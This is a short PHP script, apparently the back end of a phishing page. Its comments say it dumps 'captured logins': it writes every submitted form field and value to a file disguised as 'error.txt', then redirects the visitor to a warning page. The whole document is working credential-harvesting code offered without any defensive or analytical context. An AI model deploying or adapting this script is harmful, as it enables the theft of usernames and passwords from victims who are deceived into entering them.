<?php
//Twitter: @johntroony
//Github: JohnTroony

//open file to dump the captured logins
$handle = fopen("error.txt", "a");

//Write submitted post entry from the form in the open file
foreach($_POST as $variable => $value) {
   fwrite($handle, $variable);
   fwrite($handle, "=");
   fwrite($handle, $value);
   fwrite($handle, "\r\n");
}
fwrite($handle, "\r\n");

//close the file and refer to another web file
fclose($handle);
header ('Location: Warning.htm');
exit;
?>
